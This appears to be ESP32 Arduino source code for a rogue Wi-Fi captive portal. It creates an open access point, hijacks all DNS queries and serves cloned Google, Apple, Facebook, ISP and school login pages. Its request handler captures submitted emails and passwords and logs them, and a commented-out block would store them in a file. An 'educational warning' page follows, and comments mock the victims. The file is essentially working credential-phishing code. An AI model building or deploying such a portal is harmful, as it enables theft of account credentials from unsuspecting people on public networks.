  /*  ˗ˏˋ 𒉭  Dynamic captive portal  𒉭 ˊˎ˗  */

//Define libraries & variables
#include <DNSServer.h>
#include <WiFi.h>
#include <AsyncTCP.h>
#include "ESPAsyncWebServer.h"
#include "FS.h"
#include <LittleFS.h>

// Server related variables
DNSServer dnsServer;
AsyncWebServer server(80);

// Defining Credwntial variables
String email; // email
String passwd; // pass
bool email_received = false;
bool passwd_received = false;

// Handle requests
class CaptiveRequestHandler : public AsyncWebHandler {
public:
  CaptiveRequestHandler() {}
  virtual ~CaptiveRequestHandler() {}

  bool canHandle(AsyncWebServerRequest *request){
    //request->addInterestingHeader("ANY");
    return true;
  }

  void handleRequest(AsyncWebServerRequest *request) {
    request->send(LittleFS, "/index.html", "text/html");
  }
};

void setupServer() {
  // Handle unknown requests (default to index.html for captive portal)
  server.onNotFound([](AsyncWebServerRequest *request){
    request->send(LittleFS, "/school.html", "text/html"); //4testing purposes for now
  });

  // Serve images 
  server.on("/isplogo.png", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(LittleFS, "/isplogo.png", "image/png");
  });
  server.on("/Kelogo.png", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(LittleFS, "/Kelogo.png", "image/png");
  });
  server.on("/topbanner.png", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(LittleFS, "/topbanner.png", "image/png");
  });

  // Serve other pages
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(LittleFS, "/index.html", "text/html"); //testing 
  });

  server.on("/google", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(LittleFS, "/google.html", "text/html");
  });

  server.on("/apple", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(LittleFS, "/apple.html", "text/html");
  });

  server.on("/facebook", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(LittleFS, "/facebook.html", "text/html");
  });

  server.on("/warning", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(LittleFS, "/warning.html", "text/html"); 
  });

  server.on("/school", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(LittleFS, "/school.html", "text/html");
  });

  // Receive and process user input (Backend handling) 
  //Annoying error where i cant see all the strings and are replaced by annoying "?" emoji
  // add jackpot.txt file?
  server.on("/get", HTTP_GET , [] (AsyncWebServerRequest *request) {
    String inputMessage;
    
    // Capture email
    if (request->hasParam("email")) {
      inputMessage = request->getParam("email")->value(); //the true makes it read from the POST body n0t url
      email = inputMessage;
      Serial.println("Captured Email: " + inputMessage);
      email_received = true;
    }
    
    // Capture Passwd
    if (request->hasParam("passwd")) {
      inputMessage = request->getParam("passwd")->value();
      passwd = inputMessage;
      Serial.println("Captured Password: " + inputMessage);
      passwd_received = true;
    }
    // Send educational warning after credental leak 
    request->send(LittleFS, "/warning.html", "text/html");
  });
}

void setup(){
  // 0ther setup stuff...
  Serial.begin(115200);
  Serial.println();

  // start SPIFFS
  if (!LittleFS.begin(true)){
    Serial.print("LittleFS FAILED!");
    return;    
  }
  Serial.println("LittleFS mount successful");

  // AP set up & dns
  Serial.println("Setting up AP Mode");
  WiFi.mode(WIFI_AP); 
  WiFi.softAP("Succubus");
  Serial.print("AP IP address: ");Serial.println(WiFi.softAPIP());
  Serial.println("Setting up Async WebServer");
  setupServer();

  Serial.println("Starting DNS Server");
  dnsServer.start(53, "*", WiFi.softAPIP());
  server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER); //only when requested from AP
  // more handlers...
  server.begin();
  Serial.println("All Done!");

  if(email_received && passwd_received){
    Serial.print("Captured Email: ");Serial.println(email);
    Serial.print("Captured Passwd ");Serial.println(passwd);

    Serial.println("Waiting for the next MWERE now ( -_•)▄︻デ══━一 ");
    Serial.println("   -𒉭𒉭𒉭𒉭𒉭𒉭𒉭𒉭𒉭𒉭𒉭𒉭𒉭-");
    /*  UNTESTED till i find a way to access the txt file but this works fine for now, if push comes to shove
    implement a loop that prints out the contents after every 10 - 20 seconds. dont like this implementation 
    option two is via file explora this is much better flow and sequence to the ? error 
    // Saving captured creds into a txt file 2 counter that one error
    File f = LittleFS.open("/piggybank.txt", "a"); // "a" autocreates if not there
    if (!f){
      Serial.println("Failed to access piggybank.txt");
      return;
    }
    f.println(email);
    f.println(passwd);
    f.println(" <3 ");
    */
    //reset variables 
    email_received = false;
    passwd_received = false;
      // does it work? who knows?
  }
}

void loop(){
  dnsServer.processNextRequest();
}


